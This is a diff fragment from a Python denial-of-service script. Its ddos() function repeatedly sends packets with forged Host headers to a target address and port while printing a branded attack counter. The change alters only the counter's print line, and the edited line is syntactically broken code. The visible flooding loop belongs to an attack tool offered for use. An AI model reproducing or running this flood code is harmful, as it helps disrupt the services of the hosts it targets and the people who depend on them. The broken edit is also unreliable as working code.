@@ -51,7 +51,7 @@ def ddos():
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_num += 1
-                print("[÷]  \033[0;36mMalack-313 \033[0;31m▒\033[1;37m▒ \033[0;37mGET \033[1;33mattack \033[1;32m@ ▒\033[0m"+ str(attack_num))
+                print("[÷]  \033[0;36mMalack-313 \033[0;31m▒\033[1;37m▒ \033[0;37mGET \033[1;33mattack \033[1;32m@ ▒ \033[0m"+ str(attack_num) running 🇵🇸)
             except socket.error:
                 print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK IP OR PORT')
                 break
